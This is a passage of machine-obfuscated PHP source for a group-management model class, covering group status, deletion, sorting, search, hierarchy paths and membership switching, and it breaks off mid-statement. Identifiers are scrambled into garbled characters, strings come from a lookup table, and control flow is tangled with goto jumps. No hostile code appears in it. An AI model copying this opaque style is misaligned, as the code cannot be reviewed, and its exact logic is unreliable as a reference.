function groupStatus($BÁ­é“‰·, $d²¯¬ôä¤·) { goto A¾ùÔ­½Ğ¸; A¾ùÔ­½Ğ¸: $B·áƒöÊ‘È =& $_SERVER[ä°„ä°º]; $F–‡”—èêç = $this->getInfoSimple($BÁ­é“‰·); if (!$F–‡”—èêç) { return !1; } goto A§Ò»¢Òã; A§Ò»¢Òã: if ($d²¯¬ôä¤· == $B·áƒöÊ‘È[87]) { $C™ãˆÅ¨î = $this->parentLevelArray($F–‡”—èêç[$B·áƒöÊ‘È[502]]); } else { $b…º½¨£¾¢ = array($B·áƒöÊ‘È[566] => array($B·áƒöÊ‘È[525], $F–‡”—èêç[$B·áƒöÊ‘È[502]] . $F–‡”—èêç[$B·áƒöÊ‘È[1720]] . $B·áƒöÊ‘È[526])); $C™ãˆÅ¨î = $this->where($b…º½¨£¾¢)->field($B·áƒöÊ‘È[1720])->select(); $C™ãˆÅ¨î = array_to_keyvalue($C™ãˆÅ¨î, $B·áƒöÊ‘È[33], $B·áƒöÊ‘È[1720]); } $C™ãˆÅ¨î[] = $F–‡”—èêç[$B·áƒöÊ‘È[1720]]; $AËĞ•º®ÒÑ = array(); goto dÇ¨åÓÁ“á; dÇ¨åÓÁ“á: foreach ($C™ãˆÅ¨î as $BÁ­é“‰·) { $AËĞ•º®ÒÑ[] = array($B·áƒöÊ‘È[1720] => $BÁ­é“‰·, $B·áƒöÊ‘È[93] => $B·áƒöÊ‘È[733], $B·áƒöÊ‘È[372] => $d²¯¬ôä¤·); } return Model($B·áƒöÊ‘È[1800])->addAll($AËĞ•º®ÒÑ, array(), !0); goto BŠòïè´¶Ğ; BŠòïè´¶Ğ: } protected function groupRemove($a§åë©èÔÏ) { goto EÖœÌÂ¦á; a„ãÆ¹ÚÓ: Model($Eãø²¬Í±¨[813])->groupRootRemove($a§åë©èÔÏ); return $this->where($cÙöƒ¡×ğË)->delete(); goto Fá÷£‘˜; EÖœÌÂ¦á: $Eãø²¬Í±¨ =& $_SERVER[ä°„ä°º]; $cÙöƒ¡×ğË = array($Eãø²¬Í±¨[1720] => $a§åë©èÔÏ); $a£ŠÆ°í» = $this->where($cÙöƒ¡×ğË)->find(); goto E¤—ÊØÃœÊ; D‡ò–º£Öô: $this->where(array($Eãø²¬Í±¨[478] => $a§åë©èÔÏ))->save(array($Eãø²¬Í±¨[478] => $a£ŠÆ°í»[$Eãø²¬Í±¨[478]])); Model($Eãø²¬Í±¨[1800])->where($cÙöƒ¡×ğË)->delete(); Model($Eãø²¬Í±¨[1801])->where($cÙöƒ¡×ğË)->delete(); goto a„ãÆ¹ÚÓ; E¤—ÊØÃœÊ: if (!$a£ŠÆ°í» || $a£ŠÆ°í»[$Eãø²¬Í±¨[478]] == 0) { return !1; } $d¢ÒÉ…İ = $this->getInfoSimple($a£ŠÆ°í»[$Eãø²¬Í±¨[478]]); $this->_changeChildLevel($a£ŠÆ°í», $d¢ÒÉ…İ, !0); goto D‡ò–º£Öô; Fá÷£‘˜: } protected function groupSort($fŠáÖêâ¨ä) { $bœ‡øÒ¾µà =& $_SERVER[ä°„ä°º]; $CóÏŠºåËÖ = array(); foreach ($fŠáÖêâ¨ä as $AÎã‡‘¬º => $Eçô—²ìéš) { $CóÏŠºåËÖ[] = array($bœ‡øÒ¾µà[1720], $Eçô—²ìéš, $bœ‡øÒ¾µà[1743], $AÎã‡‘¬º + 1); } $this->saveAll($CóÏŠºåËÖ); } public function listData() { $D®Ì‹ÔçÆó = $this->_makeOrder()->selectPage(50); $this->_listDataApply($D®Ì‹ÔçÆó[$_SERVER[ä°„ä°º][367]]); return $D®Ì‹ÔçÆó; } private function _makeOrder($fĞŠ¤Í‡Í‹ = '') { goto D£ÇÛŸªõ; B‚‰ÂÛ™«: $fĞŠ¤Í‡Í‹ = $fĞŠ¤Í‡Í‹ . "{$BÍî®Ù“ÅÓ}\40{$FóŒÖ™÷Å}\x2c\40\147\x72\157\x75\160\111\x44\40\141\x73\x63"; return $this->order($fĞŠ¤Í‡Í‹); goto b™§İŠÚ­‚; D£ÇÛŸªõ: $Bó¶¨ò¢Àã =& $_SERVER[ä°„ä°º]; $Fí‚·¼‘ = array($Bó¶¨ò¢Àã[1720], $Bó¶¨ò¢Àã[28], $Bó¶¨ò¢Àã[1706], $Bó¶¨ò¢Àã[194]); $d°´í÷÷­° = array($Bó¶¨ò¢Àã[428] => $Bó¶¨ò¢Àã[429], $Bó¶¨ò¢Àã[430] => $Bó¶¨ò¢Àã[431]); goto Cß†µªÃä; Cß†µªÃä: $BÍî®Ù“ÅÓ = Input::get($Bó¶¨ò¢Àã[435], $Bó¶¨ò¢Àã[7], $Bó¶¨ò¢Àã[1724], $Fí‚·¼‘); $FóŒÖ™÷Å = Input::get($Bó¶¨ò¢Àã[436], $Bó¶¨ò¢Àã[7], $Bó¶¨ò¢Àã[1802], array($Bó¶¨ò¢Àã[1802], $Bó¶¨ò¢Àã[430])); $FóŒÖ™÷Å = $d°´í÷÷­°[$FóŒÖ™÷Å]; goto B‚‰ÂÛ™«; b™§İŠÚ­‚: } public function listChild($bÆÔá¨‹‘) { $bÓ¬ŠÏ¥ =& $_SERVER[ä°„ä°º]; $EîøÍ¯Œª¿ = $this->where(array($bÓ¬ŠÏ¥[478] => $bÆÔá¨‹‘))->_makeOrder()->selectPage(200); $this->_listDataApply($EîøÍ¯Œª¿[$bÓ¬ŠÏ¥[367]]); return $EîøÍ¯Œª¿; } public function listByID($D‰©éóÙ’) { $DÌå¯Ÿ§éİ =& $_SERVER[ä°„ä°º]; if (!$D‰©éóÙ’) { return array(); } $cŠáŒ¼‰ƒâ = array($DÌå¯Ÿ§éİ[1720] => array($DÌå¯Ÿ§éİ[7], $D‰©éóÙ’)); $cÏõôÌ†á¿ = $this->where($cŠáŒ¼‰ƒâ)->select(); $this->_listDataApply($cÏõôÌ†á¿); return $cÏõôÌ†á¿; } public function listSearch($c„ËË—³­ñ) { goto fÀÎõµö¼‹; f£ãæ Ï§¨: if ($bâŒßàÑÊ‰) { $BòÆÚéƒ¦š = $this->getInfoSimple($bâŒßàÑÊ‰); $Cç¢†¢„ß = $BòÆÚéƒ¦š[$bˆ¼ŠĞïÅÔ[502]] . $bâŒßàÑÊ‰ . $bˆ¼ŠĞïÅÔ[526]; $BìÂ–ğ‰” = array($BìÂ–ğ‰”, array($bˆ¼ŠĞïÅÔ[502] => array($bˆ¼ŠĞïÅÔ[380], $Cç¢†¢„ß))); } $BìÂ–ğ‰” = $this->parseWhereLike($BìÂ–ğ‰”); $a¨¹î„° = $this->_makeOrder()->where($BìÂ–ğ‰”)->selectPage(20); goto BºóÂ‘‚ÂÛ; c›“š…Á‰…: if (!trim($bÑñîÛÈŞ±)) { return !1; } $bÑñîÛÈŞ± = str_replace($bˆ¼ŠĞïÅÔ[1805], $bˆ¼ŠĞïÅÔ[1806], $bÑñîÛÈŞ±); $BìÂ–ğ‰” = array($bˆ¼ŠĞïÅÔ[1720] => array($bˆ¼ŠĞïÅÔ[380], "{$bÑñîÛÈŞ±}\x25"), $bˆ¼ŠĞïÅÔ[28] => array($bˆ¼ŠĞïÅÔ[380], "\x25{$bÑñîÛÈŞ±}\x25"), $bˆ¼ŠĞïÅÔ[979] => $bˆ¼ŠĞïÅÔ[1807]); goto f£ãæ Ï§¨; f³ªÔáõÃÇ: return $a¨¹î„°; goto B®ˆ”ŞÌÅ¸; fÀÎõµö¼‹: $bˆ¼ŠĞïÅÔ =& $_SERVER[ä°„ä°º]; $bÑñîÛÈŞ± = $c„ËË—³­ñ[$bˆ¼ŠĞïÅÔ[1803]]; $bâŒßàÑÊ‰ = isset($c„ËË—³­ñ[$bˆ¼ŠĞïÅÔ[1804]]) ? $c„ËË—³­ñ[$bˆ¼ŠĞïÅÔ[1804]] : !1; goto c›“š…Á‰…; BºóÂ‘‚ÂÛ: $a¨¹î„° = $a¨¹î„° ? $a¨¹î„° : array($bˆ¼ŠĞïÅÔ[367] => array(), $bˆ¼ŠĞïÅÔ[364] => array()); if (!$a¨¹î„° || count($a¨¹î„°[$bˆ¼ŠĞïÅÔ[367]]) < 5 && Input::check($bÑñîÛÈŞ±, $bˆ¼ŠĞïÅÔ[316])) { goto D„ÆÆÆŒÈÎ; dĞù»ëØ»¹: $a¨¹î„°[$bˆ¼ŠĞïÅÔ[364]][$bˆ¼ŠĞïÅÔ[366]] = ceil($a¨¹î„°[$bˆ¼ŠĞïÅÔ[364]][$bˆ¼ŠĞïÅÔ[365]] / $a¨¹î„°[$bˆ¼ŠĞïÅÔ[364]][$bˆ¼ŠĞïÅÔ[361]]); goto A±ªÇ§¢ ; C¨÷åÄù„½: $d­Á¿á½‰õ = array_merge($eÂ±Œ¬ª‚½, $a¹¥—ßÕæ, $a¨¹î„°[$bˆ¼ŠĞïÅÔ[367]]); $a¨¹î„°[$bˆ¼ŠĞïÅÔ[367]] = array_unique_by_key($d­Á¿á½‰õ, $bˆ¼ŠĞïÅÔ[1720]); $a¨¹î„°[$bˆ¼ŠĞïÅÔ[364]][$bˆ¼ŠĞïÅÔ[365]] = count($a¨¹î„°[$bˆ¼ŠĞïÅÔ[367]]); goto dĞù»ëØ»¹; D„ÆÆÆŒÈÎ: $dÒ¥¼¶×„ = $this->groupChildrenAll($bâŒßàÑÊ‰); $eÂ±Œ¬ª‚½ = $this->_searchFromMeta($bˆ¼ŠĞïÅÔ[443], $bÑñîÛÈŞ±, 10, $dÒ¥¼¶×„); $a¹¥—ßÕæ = $this->_searchFromMeta($bˆ¼ŠĞïÅÔ[444], $bÑñîÛÈŞ±, 10, $dÒ¥¼¶×„); goto C¨÷åÄù„½; A±ªÇ§¢ : } $this->_listDataApply($a¨¹î„°[$bˆ¼ŠĞïÅÔ[367]]); goto f³ªÔáõÃÇ; B®ˆ”ŞÌÅ¸: } protected function groupChildrenAll($fõñóéå÷) { $cçñˆÇÓ‰“ =& $_SERVER[ä°„ä°º]; if (!$fõñóéå÷) { return !1; } if (is_string($fõñóéå÷)) { $fõñóéå÷ = array($fõñóéå÷); } $dê’Äã¸Ó° = $fõñóéå÷; foreach ($fõñóéå÷ as $BİÊ¢ªæˆ) { $b¬èòœ‹¦  = $this->getInfoSimple($BİÊ¢ªæˆ); $aº Îâ±Ä = array($cçñˆÇÓ‰“[502] => array($cçñˆÇÓ‰“[380], $b¬èòœ‹¦ [$cçñˆÇÓ‰“[502]] . $BİÊ¢ªæˆ . $cçñˆÇÓ‰“[526])); $fâÉÖÀ¼ = $this->field($cçñˆÇÓ‰“[1720])->where($aº Îâ±Ä)->select(); $dê’Äã¸Ó° = array_merge($dê’Äã¸Ó°, array_to_keyvalue($fâÉÖÀ¼, $cçñˆÇÓ‰“[33], $cçñˆÇÓ‰“[1720])); } return array_unique($dê’Äã¸Ó°); } private function _searchFromMeta($DŒÄ¹¬¤, $b…¿–Ãá², $d³¥Ä›öÂğ, $c‹Íù¬ Û) { goto eµëŒà…ŸÀ; EåÃÄ‡øÑ: $fÛ¯éÛœßİ = $this->parseWhereLike($fÛ¯éÛœßİ); if ($c‹Íù¬ Û) { $fÛ¯éÛœßİ[$fóÜÅİÔ‚°[1720]] = array($fóÜÅİÔ‚°[7], $c‹Íù¬ Û); } $f¿­¼éù¯ä = Model($fóÜÅİÔ‚°[1808])->where($fÛ¯éÛœßİ)->limit($d³¥Ä›öÂğ)->select(); goto aŠ¤‘ïã¯; aŠ¤‘ïã¯: if (!$f¿­¼éù¯ä) { return array(); } $f¿­¼éù¯ä = array_to_keyvalue($f¿­¼éù¯ä, $fóÜÅİÔ‚°[33], $fóÜÅİÔ‚°[1720]); $cíŒ§ËšÍœ = $this->where(array($fóÜÅİÔ‚°[1798] => array($fóÜÅİÔ‚°[7], $f¿­¼éù¯ä)))->select(); goto Eãˆá—¸; Eãˆá—¸: if (!$cíŒ§ËšÍœ) { return array(); } return $cíŒ§ËšÍœ; goto FôğèÅ„°ë; eµëŒà…ŸÀ: $fóÜÅİÔ‚° =& $_SERVER[ä°„ä°º]; $b…¿–Ãá² = strtolower($b…¿–Ãá²); $fÛ¯éÛœßİ = array($fóÜÅİÔ‚°[93] => $DŒÄ¹¬¤, $fóÜÅİÔ‚°[372] => array($fóÜÅİÔ‚°[380], "\x25{$b…¿–Ãá²}\x25")); goto EåÃÄ‡øÑ; FôğèÅ„°ë: } protected function _listDataApplyItem($a˜ìšÂ¾¨™) { $dæÙª´ÜÆÍ = array($a˜ìšÂ¾¨™); $this->_listDataApply($dæÙª´ÜÆÍ); return $dæÙª´ÜÆÍ[0]; } protected function _listDataApply(&$Aé¢Ÿã¯­·) { goto bŸ±Á¤Ô“â; aª³é×°Ğí: $this->_listAppendChildren($Aé¢Ÿã¯­·); $this->_listAppendChildrenMember($Aé¢Ÿã¯­·); $this->_listAppendMeta($Aé¢Ÿã¯­·, $f·‹Éó Ü); goto AÕ¾Ü¬¯ù; AÕ¾Ü¬¯ù: $this->_listAppendParent($Aé¢Ÿã¯­·); $this->_listAppendSourceRoot($Aé¢Ÿã¯­·, $f·‹Éó Ü); goto b‡Åê¬àÔ; bŸ±Á¤Ô“â: $CÎ‹ïŞ¡¾ =& $_SERVER[ä°„ä°º]; if (!$Aé¢Ÿã¯­·) { return; } $f·‹Éó Ü = array_to_keyvalue($Aé¢Ÿã¯­·, $CÎ‹ïŞ¡¾[33], $CÎ‹ïŞ¡¾[1720]); goto aª³é×°Ğí; b‡Åê¬àÔ: } private function _listAppendChildren(&$fÒÒî„¼ÛÚ) { goto C ‘ˆÖÑ…Í; EÏ´êÀÃÉÎ: foreach ($fÒÒî„¼ÛÚ as &$cƒÁê°¿ÁÎ) { $fóÒ™±×¥¶ = $cƒÁê°¿ÁÎ[$c‡öÀÄ’ÈŠ[1720]]; $cƒÁê°¿ÁÎ[$c‡öÀÄ’ÈŠ[1810]] = isset($FÚªğâ‰èÌ[$fóÒ™±×¥¶]) ? intval($FÚªğâ‰èÌ[$fóÒ™±×¥¶]) : !1; } unset($cƒÁê°¿ÁÎ); goto c”Û–·Ç‹à; eÔøÏ„åŞ: $fŸĞ‰œëÄ = array($c‡öÀÄ’ÈŠ[478], $c‡öÀÄ’ÈŠ[1809] => $c‡öÀÄ’ÈŠ[480]); $AéöÂÍŞ® = $this->field($fŸĞ‰œëÄ)->where($Aæ²æ“§Ÿ)->group($c‡öÀÄ’ÈŠ[478])->select(); $FÚªğâ‰èÌ = array_to_keyvalue($AéöÂÍŞ®, $c‡öÀÄ’ÈŠ[478], $c‡öÀÄ’ÈŠ[480]); goto EÏ´êÀÃÉÎ; C ‘ˆÖÑ…Í: $c‡öÀÄ’ÈŠ =& $_SERVER[ä°„ä°º]; $F»º£Èƒƒ = array_to_keyvalue($fÒÒî„¼ÛÚ, $c‡öÀÄ’ÈŠ[33], $c‡öÀÄ’ÈŠ[1720]); $Aæ²æ“§Ÿ = array($c‡öÀÄ’ÈŠ[478] => array($c‡öÀÄ’ÈŠ[7], $F»º£Èƒƒ)); goto eÔøÏ„åŞ; c”Û–·Ç‹à: } private function _listAppendChildrenMember(&$CáœÛÄ¬£) { goto FªÅ›¸¶Öè; b²ÔĞÃ÷: $b†á¥Äˆ = array($cİ”ß Ø²[1720], $cİ”ß Ø²[1809] => $cİ”ß Ø²[480]); $f‡™Š„äÓ = Model($cİ”ß Ø²[1801])->field($b†á¥Äˆ)->where($eº‡‰Âîî)->group($cİ”ß Ø²[1720])->select(); $d–©â¢ù›Ç = array_to_keyvalue($f‡™Š„äÓ, $cİ”ß Ø²[1720], $cİ”ß Ø²[480]); goto B²˜ëÌÙà”; FªÅ›¸¶Öè: $cİ”ß Ø² =& $_SERVER[ä°„ä°º]; $dá«ğ„ÆÙ = array_to_keyvalue($CáœÛÄ¬£, $cİ”ß Ø²[33], $cİ”ß Ø²[1720]); $eº‡‰Âîî = array($cİ”ß Ø²[1720] => array($cİ”ß Ø²[7], $dá«ğ„ÆÙ)); goto b²ÔĞÃ÷; B²˜ëÌÙà”: foreach ($CáœÛÄ¬£ as &$b¾ËæñÖ„‹) { $E”Êä¸¶ = $b¾ËæñÖ„‹[$cİ”ß Ø²[1720]]; $b¾ËæñÖ„‹[$cİ”ß Ø²[1811]] = isset($d–©â¢ù›Ç[$E”Êä¸¶]) ? intval($d–©â¢ù›Ç[$E”Êä¸¶]) : !1; } unset($b¾ËæñÖ„‹); goto F¡•Üâó¸Ö; F¡•Üâó¸Ö: } private function _listAppendMeta(&$E¾¬Š„˜Ú, $e®÷œ·š) { goto BÛ…¿é÷”Ÿ; f‹”Ë½Ä½: foreach ($E¾¬Š„˜Ú as &$CÑãæ¥¦) { $CÑãæ¥¦[$Aãæõ¥Ï [445]] = array(); if (isset($fÄ°ì„‰¡Õ[$CÑãæ¥¦[$Aãæõ¥Ï [1720]]])) { $CÑãæ¥¦[$Aãæõ¥Ï [445]] = $fÄ°ì„‰¡Õ[$CÑãæ¥¦[$Aãæõ¥Ï [1720]]]; } } unset($CÑãæ¥¦); goto cÇ”Ş‰Àó; C‰­ƒ¹¯É»: $fÄ°ì„‰¡Õ = array_to_keyvalue_group($fÄ°ì„‰¡Õ, $Aãæõ¥Ï [1720]); foreach ($fÄ°ì„‰¡Õ as &$EŒĞêğ‘Ş) { $EŒĞêğ‘Ş = array_to_keyvalue($EŒĞêğ‘Ş, $Aãæõ¥Ï [93], $Aãæõ¥Ï [372]); } unset($EŒĞêğ‘Ş); goto f‹”Ë½Ä½; BÛ…¿é÷”Ÿ: $Aãæõ¥Ï  =& $_SERVER[ä°„ä°º]; $eš¯¥‹’ÌÌ = array($Aãæõ¥Ï [1720] => array($Aãæõ¥Ï [7], $e®÷œ·š)); $fÄ°ì„‰¡Õ = Model($Aãæõ¥Ï [1800])->where($eš¯¥‹’ÌÌ)->select(); goto C‰­ƒ¹¯É»; cÇ”Ş‰Àó: } protected function parentLevelArray($f½à “±¤) { $BÑ‡öß‘Â =& $_SERVER[ä°„ä°º]; $f½à “±¤ = explode($BÑ‡öß‘Â[47], trim($f½à “±¤, $BÑ‡öß‘Â[47])); $f½à “±¤ = array_remove_value($f½à “±¤, $BÑ‡öß‘Â[191]); return $f½à “±¤; } private function _listAppendParent(&$a°…ÏƒŞœ÷) { goto E‹Åí†§Ö³; fÕÂî¹Ôº¾: if ($GLOBALS[$d§ÆØ½á³[485]] == $d§ÆØ½á³[87]) { $A¬¾£»‡Ì = !1; } foreach ($a°…ÏƒŞœ÷ as &$B‡Ğ³†˜õù) { $c¾ÍƒŸÒš = $this->parentLevelArray($B‡Ğ³†˜õù[$d§ÆØ½á³[502]]); $DµƒÎ§¨¦É = $d§ÆØ½á³[33]; foreach ($c¾ÍƒŸÒš as $b‡½‚ã¾¡ß => $EŠ°šîÁ’÷) { if ($A¬¾£»‡Ì && $b‡½‚ã¾¡ß == 0) { continue; } $DµƒÎ§¨¦É .= $Cíä±áåÖ[$EŠ°šîÁ’÷] . $d§ÆØ½á³[8]; } if ($c¾ÍƒŸÒš) { $DµƒÎ§¨¦É .= $B‡Ğ³†˜õù[$d§ÆØ½á³[28]]; } $B‡Ğ³†˜õù[$d§ÆØ½á³[507]] = str_replace($d§ÆØ½á³[510], $d§ÆØ½á³[8], $DµƒÎ§¨¦É); } unset($B‡Ğ³†˜õù); goto B¥©´ƒùç; E‹Åí†§Ö³: $d§ÆØ½á³ =& $_SERVER[ä°„ä°º]; $Cíä±áåÖ = array(); foreach ($a°…ÏƒŞœ÷ as &$B‡Ğ³†˜õù) { $Cíä±áåÖ[$B‡Ğ³†˜õù[$d§ÆØ½á³[1720]]] = $B‡Ğ³†˜õù[$d§ÆØ½á³[28]]; $c¾ÍƒŸÒš = $this->parentLevelArray($B‡Ğ³†˜õù[$d§ÆØ½á³[502]]); foreach ($c¾ÍƒŸÒš as $EŠ°šîÁ’÷) { if (!isset($Cíä±áåÖ[$EŠ°šîÁ’÷])) { $Cíä±áåÖ[$EŠ°šîÁ’÷] = 0; } } } goto D¢›š„Ğçò; D¢›š„Ğçò: unset($B‡Ğ³†˜õù); foreach ($Cíä±áåÖ as $b‡½‚ã¾¡ß => $c¾ËÂ•ãßŒ) { if ($c¾ËÂ•ãßŒ) { continue; } $CùŞ´Í‹¿¡ = $this->getInfoSimple($b‡½‚ã¾¡ß); $Cíä±áåÖ[$b‡½‚ã¾¡ß] = $CùŞ´Í‹¿¡[$d§ÆØ½á³[28]]; } $A¬¾£»‡Ì = $GLOBALS[$d§ÆØ½á³[6]][$d§ÆØ½á³[88]][$d§ÆØ½á³[1812]]; goto fÕÂî¹Ôº¾; B¥©´ƒùç: } private function _listAppendSourceRoot(&$bÆÏ¡æ»æê, $AĞô·Á§½) { goto dâ¾´¢ƒô; BÒÏºÁÍ†Ê: $B™õ³ºŠ‰Ä = Model($fÑßŒÑÕòÇ[813])->order($fÑßŒÑÕòÇ[1814])->field($d‡¨õÓ­²)->where($BÉÎÛÈï‡ )->select(); $B™õ³ºŠ‰Ä = array_to_keyvalue($B™õ³ºŠ‰Ä, $fÑßŒÑÕòÇ[484]); $B™õ³ºŠ‰Ä = array_remove_key($B™õ³ºŠ‰Ä, $fÑßŒÑÕòÇ[484]); goto A¡Ó•¤ƒì§; dâ¾´¢ƒô: $fÑßŒÑÕòÇ =& $_SERVER[ä°„ä°º]; $BÉÎÛÈï‡  = array($fÑßŒÑÕòÇ[404] => SourceModel::TYPE_GROUP, $fÑßŒÑÕòÇ[478] => 0, $fÑßŒÑÕòÇ[484] => array($fÑßŒÑÕòÇ[7], $AĞô·Á§½)); $d‡¨õÓ­² = $fÑßŒÑÕòÇ[1813]; goto BÒÏºÁÍ†Ê; A¡Ó•¤ƒì§: foreach ($bÆÏ¡æ»æê as &$DêéˆˆŞ÷¹) { $DêéˆˆŞ÷¹[$fÑßŒÑÕòÇ[85]] = $B™õ³ºŠ‰Ä[$DêéˆˆŞ÷¹[$fÑßŒÑÕòÇ[1720]]] ? $B™õ³ºŠ‰Ä[$DêéˆˆŞ÷¹[$fÑßŒÑÕòÇ[1720]]] : array(); } unset($DêéˆˆŞ÷¹); goto dƒ­§Á„; dƒ­§Á„: } protected function groupMerge($C½Æ†‡ò©¹) { $C½Æ†‡ò©¹ = array_values(array_unique($C½Æ†‡ò©¹)); $FŒî¹ó—ğ = array(); for ($bŒÇ¯Øì = 0; $bŒÇ¯Øì < count($C½Æ†‡ò©¹); $bŒÇ¯Øì++) { $AÖœÉãİ¶ = !1; for ($f•¶÷ÈïÊİ = 0; $f•¶÷ÈïÊİ < count($C½Æ†‡ò©¹); $f•¶÷ÈïÊİ++) { if ($bŒÇ¯Øì == $f•¶÷ÈïÊİ) { continue; } if ($this->isParentOf($C½Æ†‡ò©¹[$f•¶÷ÈïÊİ], $C½Æ†‡ò©¹[$bŒÇ¯Øì])) { $AÖœÉãİ¶ = !0; break; } } if (!$AÖœÉãİ¶) { $FŒî¹ó—ğ[] = $C½Æ†‡ò©¹[$bŒÇ¯Øì]; } } return $FŒî¹ó—ğ; } protected function isParentOf($a¯æÔ…ÓÑÈ, $a¿®ÁË„ÕË) { goto d‹ç—»ì·; d‹ç—»ì·: $E…˜×´ =& $_SERVER[ä°„ä°º]; if (!$a¯æÔ…ÓÑÈ || !$a¿®ÁË„ÕË || $a¯æÔ…ÓÑÈ == $a¿®ÁË„ÕË) { return !1; } $A„µŞÌ£¤˜ = $this->getInfoSimple($a¯æÔ…ÓÑÈ); goto c¬á–›‹¢; c¬á–›‹¢: $f¬ë·ù°Ê‰ = $this->getInfoSimple($a¿®ÁË„ÕË); $Bƒ×­ôÜ¤¼ = $A„µŞÌ£¤˜[$E…˜×´[502]] . $a¯æÔ…ÓÑÈ . $E…˜×´[47]; if (substr($f¬ë·ù°Ê‰[$E…˜×´[502]], 0, strlen($Bƒ×­ôÜ¤¼)) == $Bƒ×­ôÜ¤¼) { return !0; } goto BôŒàùÑñ; BôŒàùÑñ: return !1; goto C¨¦õ„˜­†; C¨¦õ„˜­†: } public function groupShowRoot($fÕ‡×ø¹, $bÃÃ»İ¤«Û = false) { goto e¨°ËË×·; e¨°ËË×·: $Cë«öñÜ¤ =& $_SERVER[ä°„ä°º]; $C‘‹ÑöÑ©ù = $this->getInfo($fÕ‡×ø¹); if (!$C‘‹ÑöÑ©ù) { return array(); } goto E‘ßƒĞ©Œ; e¦¼”·¤Œµ: if ($bÃÃ»İ¤«Û && count($F…Òİ·¤øæ) == 1) { return $eóÑ³ğÄ±; } if (!$C‘‹ÑöÑ©ù[$Cë«öñÜ¤[445]] || !isset($C‘‹ÑöÑ©ù[$Cë«öñÜ¤[445]][$Cë«öñÜ¤[1796]]) || $C‘‹ÑöÑ©ù[$Cë«öñÜ¤[445]][$Cë«öñÜ¤[1796]] == $Cë«öñÜ¤[1770]) { return $this->groupShowRoot($F…Òİ·¤øæ[count($F…Òİ·¤øæ) - 1], $bÃÃ»İ¤«Û); } if ($C‘‹ÑöÑ©ù[$Cë«öñÜ¤[445]][$Cë«öñÜ¤[1796]] == $Cë«öñÜ¤[355]) { $a—ƒÕå¢Õœ = explode($Cë«öñÜ¤[47], $C‘‹ÑöÑ©ù[$Cë«öñÜ¤[445]][$Cë«öñÜ¤[1797]]); if ($a—ƒÕå¢Õœ) { $eóÑ³ğÄ± = array_merge($eóÑ³ğÄ±, $a—ƒÕå¢Õœ); } } goto c÷ Í¢÷; c÷ Í¢÷: return $eóÑ³ğÄ±; goto D•Š°´¸ó½; E‘ßƒĞ©Œ: $F…Òİ·¤øæ = $this->parentLevelArray($C‘‹ÑöÑ©ù[$Cë«öñÜ¤[502]]); $eóÑ³ğÄ± = array($fÕ‡×ø¹); if (count($F…Òİ·¤øæ) == 0) { return $eóÑ³ğÄ±; } goto e¦¼”·¤Œµ; D•Š°´¸ó½: } protected function resetParentLevel() { $fÕ´›õøáÊ =& $_SERVER[ä°„ä°º]; $DÔèáÎÃ‰ = $fÕ´›õøáÊ[1720]; $fù·¥’ÃŞ‡ = $this->select(); $fù·¥’ÃŞ‡ = array_to_keyvalue($fù·¥’ÃŞ‡, $DÔèáÎÃ‰); foreach ($fù·¥’ÃŞ‡ as $BÌÛ©ĞÈ¯) { goto BùŒ¢¿øè÷; BåòÚÆ¿É¹: $this->where(array($DÔèáÎÃ‰ => $BÌÛ©ĞÈ¯[$DÔèáÎÃ‰]))->save(array($fÕ´›õøáÊ[566] => $bâÙÎİÃç¡)); goto d„æë•«”œ; BùŒ¢¿øè÷: $D–«Öâ×İ± = $BÌÛ©ĞÈ¯; $bâÙÎİÃç¡ = array(); while ($D–«Öâ×İ±[$fÕ´›õøáÊ[478]] != 0) { $bâÙÎİÃç¡[] = $D–«Öâ×İ±[$fÕ´›õøáÊ[478]]; $D–«Öâ×İ± = $fù·¥’ÃŞ‡[$D–«Öâ×İ±[$fÕ´›õøáÊ[478]]]; } goto Cœ’Ò §Ø¸; Cœ’Ò §Ø¸: $bâÙÎİÃç¡[] = 0; $bâÙÎİÃç¡ = $fÕ´›õøáÊ[47] . implode($fÕ´›õøáÊ[47], array_reverse($bâÙÎİÃç¡)) . $fÕ´›õøáÊ[47]; $this->setNamePinyin($BÌÛ©ĞÈ¯[$DÔèáÎÃ‰], $BÌÛ©ĞÈ¯[$fÕ´›õøáÊ[28]]); goto BåòÚÆ¿É¹; d„æë•«”œ: } return $fù·¥’ÃŞ‡; } public function groupNameAuto($E‰‘î¢¥¶À, $FÍïôªªÄ³) { $d†äÑ»ğ‘Ü =& $_SERVER[ä°„ä°º]; $EÀÈœŒ•¬ñ = $this->where(array($d†äÑ»ğ‘Ü[394] => $E‰‘î¢¥¶À))->getField($d†äÑ»ğ‘Ü[28], !0); if (!$EÀÈœŒ•¬ñ || !in_array($FÍïôªªÄ³, $EÀÈœŒ•¬ñ)) { return $FÍïôªªÄ³; } for ($a–Ë„¢Ö¤ç = 1; $a–Ë„¢Ö¤ç <= count($EÀÈœŒ•¬ñ) + 1; $a–Ë„¢Ö¤ç++) { $fÀ•¦ÆŸ÷ã = $FÍïôªªÄ³ . "\x28{$a–Ë„¢Ö¤ç}\51"; if (!in_array($fÀ•¦ÆŸ÷ã, $EÀÈœŒ•¬ñ)) { return $fÀ•¦ÆŸ÷ã; } } } public function groupSwitch($d÷çã¡óèŸ, $BÕÖƒÓ•Í±) { goto BÑ¨“ª÷©; aë¶…¶¾’±: $cÜ·»…ô× = Model($a„Ú‹„¶¦©[1801])->where($f¸âõÄ£³)->select(); if (!$cÜ·»…ô×) { $cÜ·»…ô× = array(); } foreach ($cÜ·»…ô× as $Aõ›ÈñÜé) { $EÓÈÏœÉÒ = $Aõ›ÈñÜé[$a„Ú‹„¶¦©[1551]]; $f¸âõÄ£³ = array($a„Ú‹„¶¦©[1551] => $EÓÈÏœÉÒ, $a„Ú‹„¶¦©[1720] => $BÕÖƒÓ•Í±); $F‚®ƒ‹•ÓÜ = Model($a„Ú‹„¶¦©[1801])->where($f¸âõÄ£³)->find(); if (!$F‚®ƒ‹•ÓÜ) { $Aæƒ®òĞ½Í = array($BÕÖƒÓ•Í± => $Aõ›ÈñÜé[$a„Ú‹„¶¦©[1815]]); Model($a„Ú‹„¶¦©[519])->userGroupAdd($EÓÈÏœÉÒ, $Aæƒ®òĞ½Í); } Model($a„Ú‹„¶¦©[519])->userGroupRemove($EÓÈÏœÉÒ, $d÷çã¡óèŸ); } goto f³ØÎï‡÷¢; f³ØÎï‡÷¢: $f¸âõÄ£³ = array($a„Ú‹„¶¦©[404] => 2, $a„Ú‹„¶¦©[478] => 0, $a„Ú‹„¶¦©[403] => 1, $a„Ú‹„¶¦©[484] => array($a„Ú‹„¶¦©[7], array($d÷çã¡óèŸ, $BÕÖƒÓ•Í±))); $eª—²¬î÷ = 